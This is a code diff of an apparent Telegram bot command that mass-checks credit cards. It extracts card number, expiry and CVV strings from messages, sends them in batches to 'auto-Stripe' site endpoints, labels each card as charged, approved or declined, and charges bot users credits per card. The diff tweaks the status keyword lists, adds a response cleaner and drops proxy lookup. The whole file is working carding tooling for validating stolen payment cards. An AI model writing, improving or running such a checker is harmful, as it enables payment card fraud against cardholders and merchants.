@@ -35,14 +35,6 @@ def load_sites():
     except:
         return {}
 
-def get_proxy(user_id):
-    try:
-        with open("DATA/proxy.json", "r") as f:
-            proxies = json.load(f)
-        return proxies.get(str(user_id))
-    except:
-        return None
-
 def deduct_credit_bulk(user_id, amount):
     try:
         with open("DATA/users.json", "r") as f:
@@ -71,11 +63,30 @@ def chunk_cards(cards, size):
 def extract_cards(text):
     return re.findall(r'(\d{12,19}\|\d{1,2}\|\d{2,4}\|\d{3,4})', text)
 
+def clean_response(raw_response):
+    """Clean and extract only the important response message"""
+    response = str(raw_response).strip()
+    
+    if '"response"' in response.lower() or '"message"' in response.lower():
+        try:
+            match = re.search(r'"(?:response|message)"\s*:\s*"([^"]+)"', response, re.IGNORECASE)
+            if match:
+                return match.group(1)
+        except:
+            pass
+    
+    response = response.replace('{', '').replace('}', '').replace('"', '')
+    
+    if len(response) > 80:
+        response = response[:80]
+    
+    return response
+
 def get_status_flag(raw_response):
     response_upper = str(raw_response).upper()
     
     if any(keyword in response_upper for keyword in [
-        "CHARGED", "ORDER_PLACED", "ORDER PLACED", "THANK YOU", "PAYMENT SUCCESS", "APPROVED"
+        "CHARGED", "ORDER_PLACED", "ORDER PLACED", "THANK YOU", "PAYMENT SUCCESS"
     ]):
         return "Charged 💎"
     elif any(keyword in response_upper for keyword in [
@@ -83,15 +94,10 @@ def get_status_flag(raw_response):
         "INSUFFICIENT_FUNDS", "INSUFFICIENT FUNDS", "INVALID_CVC", "INVALID CVC",
         "INCORRECT_CVC", "INCORRECT CVC", "CVV", "CVC", "AUTHENTICATION",
         "ZIP", "ADDRESS", "BILLING", "CARD_ERROR", "CARD ERROR", "RISK", "FRAUD",
-        "LIMIT", "DO_NOT_HONOR", "DO NOT HONOR", "LOST", "STOLEN", "TRY_AGAIN"
+        "LIMIT", "DO_NOT_HONOR", "DO NOT HONOR", "LOST", "STOLEN", "TRY_AGAIN",
+        "APPROVED"
     ]):
         return "Approved ✅"
-    elif any(keyword in response_upper for keyword in [
-        "DECLINED", "DECLINE", "REJECTED", "REJECT", "FAILED", "FAIL", "DEAD",
-        "INVALID CARD", "INVALID_CARD", "CARD_DECLINED", "CARD DECLINED",
-        "NOT SUPPORTED", "UNSUPPORTED", "EXPIRED", "BLOCKED"
-    ]):
-        return "Declined ❌"
     else:
         return "Declined ❌"
 
@@ -100,11 +106,9 @@ async def check_autostripe(site, cc):
     try:
         async with httpx.AsyncClient(timeout=120.0) as client:
             response = await client.get(url)
-            return response.text.strip() if response.text else "NO_RESPONSE"
-    except httpx.TimeoutException:
-        return "Timeout"
-    except Exception as e:
-        return f"Error"
+            return response.text.strip() if response.text else "No Response"
+    except:
+        return "Error"
 
 @Client.on_message(filters.command("mau") | filters.regex(r"^\.mau(\s|$)"))
 async def mau_handler(client, message):
@@ -216,12 +220,13 @@ async def mau_handler(client, message):
             ])
             
             for card, raw_response in zip(batch, results):
+                clean_result = clean_response(raw_response or "")
                 status_flag = get_status_flag(raw_response or "")
                 
                 final_results.append(
                     f"• <b>Card:</b> <code>{card}</code>\n"
                     f"• <b>Status:</b> <code>{status_flag}</code>\n"
-                    f"• <b>Response:</b> <code>{raw_response or '-'}</code>\n"
+                    f"• <b>Response:</b> <code>{clean_result}</code>\n"
                     "━━━━━━━━━━━━"
                 )
             
@@ -242,7 +247,6 @@ async def mau_handler(client, message):
         if available_credits != "∞":
             deduct_credit_bulk(user_id, card_count)
         
-        # Show last 15 results
         display_results = final_results[-15:] if len(final_results) > 15 else final_results
         
         await loader_msg.edit(
@@ -255,7 +259,7 @@ async def mau_handler(client, message):
         )
     
     except Exception as e:
-        await message.reply(f"⚠️ Error: {e}", reply_to_message_id=message.id)
+        await message.reply(f"⚠️ Error occurred", reply_to_message_id=message.id)
     
     finally:
         user_locks.pop(user_id, None)
